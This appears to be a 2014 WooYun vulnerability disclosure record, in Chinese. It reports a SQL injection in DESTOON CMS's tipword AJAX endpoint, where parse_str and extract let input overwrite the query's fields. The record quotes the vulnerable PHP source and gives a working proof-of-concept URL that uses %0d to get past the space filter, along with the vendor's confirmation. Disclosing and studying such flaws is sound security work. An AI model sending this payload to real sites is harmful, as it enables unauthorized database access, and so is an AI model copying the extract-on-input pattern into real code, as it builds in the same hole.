{"id": 53965, "wybug_id": "wooyun-2014-065961", "wybug_title": "DESTOON 某处SQL注射漏洞（部分原因导致鸡肋利用）", "wybug_corp": "DESTOON", "wybug_author": "Noxxx", "wybug_date": "2014-06-24 11:05", "wybug_open_date": "2014-09-22 11:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向公众公开  简要描述： 注射 ,之前提交的漏洞和这个是一个问题。。 详细说明：  ajax/tipword.inc.php:if(!$word || strlen($word) < 2 || strlen($word) > 30) exit;$word = str_replace(array(' ','*', \"\\'\"), array('%', '%', ''), $word);只能30个长度 算是鸡肋吧!..\ntag(\"moduleid=$mid&table=keyword&condition=moduleid=$mid and keyword like '%$word%'&pagesize=10&order=total_search desc&template=list-search_tip\", -2);\n$word 我们是可以控制的看下tag怎么写的\n$parameter = str_replace(array('&amp;', '%'), array('', '##'), $parameter);（//如果这个没有替换%号的就又有一个注射了..）\t$parameter = strip_sql($parameter);\tparse_str($parameter, $par);//解析字符串 我们可以把word =%26变量=值这样就行了e~\tif(!is_array($par)) return '';\t$par = dstripslashes($par);\textract($par, EXTR_SKIP); //倒入变量  下面一大堆我们都可以覆盖的 \tisset($prefix) or $prefix = $db->pre;\t\tisset($moduleid) or $moduleid = 1;\tif(!isset($MODULE[$moduleid])) return '';\tisset($fields) or $fields = '*';\tisset($catid) or $catid = 0;\tisset($child) or $child = 1;\tisset($areaid) or $areaid = 0;\tisset($areachild) or $areachild = 1;\t(isset($dir) && check_name($dir)) or $dir = 'tag';\t(isset($template) && check_name($template)) or $template = 'list';\tisset($condition) or $condition = '1';\tisset($group) or $group = '';\tisset($page) or $page = 1;\tisset($offset) or $offset = 0;\tisset($pagesize) or $pagesize = 10;\tisset($order) or $order = '';\tisset($showpage) or $showpage = 0;\tisset($showcat) or $showcat = 0;\tisset($datetype) or $datetype = 0;\tisset($target) or $target = '';\tisset($class) or $class = '';\tisset($length) or $length = 0;\tisset($introduce) or $introduce = 0;\tisset($debug) or $debug = 0;\tisset($lazy) or $lazy = 0;\t(isset($cols) && $cols) or $cols = 1;      。。。沈略。。$query = \"SELECT \".$fields.\" FROM \".$table.\" WHERE \".$condition.$order.\" LIMIT \".$offset.\",\".$pagesize;//我们之间覆盖  $fields \tif($debug) echo $parameter.'<br/>'.$query.'<br/>';\t$tags = $catids = $CATS = array();\t$result = $db->query($query, $db_cache, $tag_expires);//入库查询   。。。沈略。。include template($template, $dir);//包含模板文件 （template在后面不可更改的）应为tag穿过来的是template=list-search_tip\n模板文件内容 \n{loop $tags $i $t}<div onclick=\"setTip('{$t[word]}');\" onmouseover=\"this.className='search_t_div_2';\" onmouseout=\"this.className='search_t_div_1';\" class=\"search_t_div_1\"><span>{$t[items]} 结果</span>{$t[word]}</div>{/loop}\n 这里还有个就是 一开始把空格替换成%分号了$word = str_replace(array(' ','*', \"\\'\"), array('%', '%', ''), $word);我们可以用 回车符来替代空格 这样也不会被替换  %0d   漏洞证明：  http://127.0.0.1/php/destoon/ajax.php?action=tipword&mid=1&word=%26fields=user()%0das%0dword\n\n\n\n   修复方案：  你们更专业..   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-06-24 16:00 厂商回复： 感谢反馈，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}